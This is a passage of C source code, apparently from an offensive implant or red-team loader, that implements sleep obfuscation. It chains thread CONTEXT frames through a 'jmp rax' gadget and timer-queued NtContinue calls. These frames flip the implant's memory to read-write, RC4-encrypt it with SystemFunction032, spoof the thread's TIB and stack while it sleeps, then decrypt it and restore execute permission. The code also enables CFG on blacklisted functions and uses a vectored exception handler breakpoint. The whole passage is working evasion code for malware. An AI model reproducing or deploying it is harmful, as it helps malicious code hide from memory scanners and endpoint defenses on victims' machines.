								if ( !( Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Set = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Enc = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Gt1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Cp1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( St1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Blk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Cp2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( St2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Dec = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) { 
									/* Abort! */
									break;
								};
								if ( !( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};

								/* Get the address of the jmp rax gadget */
								if ( ( Gdg = GetJmpRaxTarget( ) ) != NULL ) { 

									/* Copy the old NT_TIB structure into a stack var */
									__builtin_memcpy( &Oli, & NtCurrentTeb()->NtTib, sizeof( NT_TIB ) );

									if ( GetThreadInfoBlockFromStack( Ctx.Rsp, &Nwi ) ) {
										if ( NT_SUCCESS( Api.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Src, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {

											/* Enable CFG on the target function in case its blacklisted */
											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtGetContextThread );
											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtSetContextThread );
											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.RtlCopyMappedMemory );

											__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
											Beg->ContextFlags = CONTEXT_FULL;
											Beg->Rip  = U_PTR( Gdg );
											Beg->Rsp -= sizeof( PVOID );
											Beg->Rax  = U_PTR( Api.WaitForSingleObjectEx );
											Beg->Rcx  = U_PTR( Ev2 );
											Beg->Rdx  = U_PTR( INFINITE );
											Beg->R8   = U_PTR( FALSE );

											__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
											Set->ContextFlags = CONTEXT_FULL;
											Set->Rip  = U_PTR( Gdg );
											Set->Rsp -= sizeof( PVOID );
											Set->Rax  = U_PTR( Api.VirtualProtect );
											Set->Rcx  = U_PTR( Img );
											Set->Rdx  = U_PTR( XLn );
											Set->R8   = U_PTR( PAGE_READWRITE );
											Set->R9   = U_PTR( &Prt );

											__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
											Enc->ContextFlags = CONTEXT_FULL;
											Enc->Rip  = U_PTR( Gdg );
											Enc->Rsp -= sizeof( PVOID );
											Enc->Rax  = U_PTR( Api.SystemFunction032 );
											Enc->Rcx  = U_PTR( &Buf );
											Enc->Rdx  = U_PTR( &Key );

											__builtin_memcpy( Gt1, &Ctx, sizeof( CONTEXT ) );
											Gt1->ContextFlags = CONTEXT_FULL;
											Cap->ContextFlags = CONTEXT_FULL;
											Gt1->Rip  = U_PTR( Gdg );
											Gt1->Rsp -= sizeof( PVOID );
											Gt1->Rax  = U_PTR( Api.NtGetContextThread );
											Gt1->Rcx  = U_PTR( Src );
											Gt1->Rdx  = U_PTR( Cap );

											__builtin_memcpy( Cp1, &Ctx, sizeof( CONTEXT ) );
											Cp1->ContextFlags = CONTEXT_FULL;
											Cp1->Rip  = U_PTR( Gdg );
											Cp1->Rsp -= sizeof( PVOID );
											Cp1->Rax  = U_PTR( Api.RtlCopyMappedMemory );
											Cp1->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
											Cp1->Rdx  = U_PTR( & Nwi );
											Cp1->R8   = U_PTR( sizeof( NT_TIB ) );

											__builtin_memcpy( St1, &Ctx, sizeof( CONTEXT ) );
											St1->ContextFlags = CONTEXT_FULL;
											St1->Rip  = U_PTR( Gdg );
											St1->Rsp -= sizeof( PVOID );
											St1->Rax  = U_PTR( Api.NtSetContextThread );
											St1->Rcx  = U_PTR( Src );
											St1->Rdx  = U_PTR( & Ctx );

											__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
											Blk->ContextFlags = CONTEXT_FULL;
											Blk->Rip  = U_PTR( Gdg );
											Blk->Rsp -= sizeof( PVOID );
											Blk->Rax  = U_PTR( Api.WaitForSingleObjectEx );
											Blk->Rcx  = U_PTR( Ev3 );
											Blk->Rdx  = U_PTR( DelayTime );
											Blk->R8   = U_PTR( FALSE );

											__builtin_memcpy( Cp2, &Ctx, sizeof( CONTEXT ) );
											Cp2->ContextFlags = CONTEXT_FULL;
											Cp2->Rip  = U_PTR( Gdg );
											Cp2->Rsp -= sizeof( PVOID );
											Cp2->Rax  = U_PTR( Api.RtlCopyMappedMemory );
											Cp2->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
											Cp2->Rdx  = U_PTR( & Oli );
											Cp2->R8   = U_PTR( sizeof( NT_TIB ) );

											__builtin_memcpy( St2, &Ctx, sizeof( CONTEXT ) );
											St2->ContextFlags = CONTEXT_FULL;
											Cap->ContextFlags = CONTEXT_FULL;
											St2->Rip  = U_PTR( Gdg );
											St2->Rsp -= sizeof( PVOID );
											St2->Rax  = U_PTR( Api.NtSetContextThread );
											St2->Rcx  = U_PTR( Src );
											St2->Rdx  = U_PTR( Cap );

											__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
											Dec->ContextFlags = CONTEXT_FULL;
											Dec->Rip  = U_PTR( Gdg );
											Dec->Rsp -= sizeof( PVOID );
											Dec->Rax  = U_PTR( Api.SystemFunction032 );
											Dec->Rcx  = U_PTR( &Buf );
											Dec->Rdx  = U_PTR( &Key );

											__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
											Res->ContextFlags = CONTEXT_FULL;
											Res->Rip  = U_PTR( Gdg );
											Res->Rsp -= sizeof( PVOID );
											Res->Rax  = U_PTR( Api.VirtualProtect );
											Res->Rcx  = U_PTR( Img );
											Res->Rdx  = U_PTR( XLn );
											Res->R8   = U_PTR( PAGE_EXECUTE_READ );
											Res->R9   = U_PTR( &Prt );

											__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
											End->ContextFlags = CONTEXT_FULL;
											End->Rip  = U_PTR( Gdg );
											End->Rsp -= sizeof( PVOID );
											End->Rax  = U_PTR( Api.SetEvent );
											End->Rcx  = U_PTR( Ev3 );

											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Set, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Enc, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Gt1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Cp1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, St1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Blk, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Cp2, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, St2, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Dec, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
											if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;

											/* Remove the breakpoint on ntdll!TpAllocTimer */
											RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

											/* Remove the Vectored Exception Handler! */
											if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
												/* Execute and await the frame results! */
												Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
											};
										};
									};
								};
							};
						};
					};
				};
			} while ( 0 );

			if ( Ev1 != NULL ) {
				Api.NtClose( Ev1 );
			};
			if ( Ev2 != NULL ) {
				Api.NtClose( Ev2 );
			};
			if ( Ev3 != NULL ) {
				Api.NtClose( Ev3 );
			};
			if ( Que != NULL ) {
				Api.RtlDeleteTimerQueue( Que ); 
			};
			if ( Cap != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cap );
			};
			if ( Beg != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Beg );
			};
			if ( Set != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Set );
			};
			if ( Enc != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Enc );
			};
			if ( Gt1 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Gt1 );
			};
			if ( Cp1 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cp1 );
			};
			if ( St1 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, St1 );
			};
			if ( Blk != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Blk );
			};
			if ( Cp2 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cp2 );
			};
			if ( St2 != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, St2 );
			};
			if ( Dec != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Dec );
			};
			if ( Res != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Res );
			};
			if ( End != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
			};
			if ( Veh != NULL ) {
				/* Remove the breakpoint on ntdll!TpAllocTimer */
				RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

				/* Remove the Vectored Exception Handler */
				Api.RtlRemoveVectoredExceptionHandler( Veh );
			};
			if ( Cln != NULL ) {
				/* Close the thread pool cleanup */
				Api.CloseThreadpoolCleanupGroupMembers( Cln, TRUE, NULL ); 
			};
			if ( Pol != NULL ) {
				/* Close the pool */
				Api.CloseThreadpool( Pol );
			};
			if ( Src != NULL ) {
				/* Close the thread handle */
				Api.NtClose( Src );
			};

			/* Dereference */
			Api.LdrUnloadDll( Adv );
		};

		/* Dereference */
		Api.LdrUnloadDll( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};

#endif
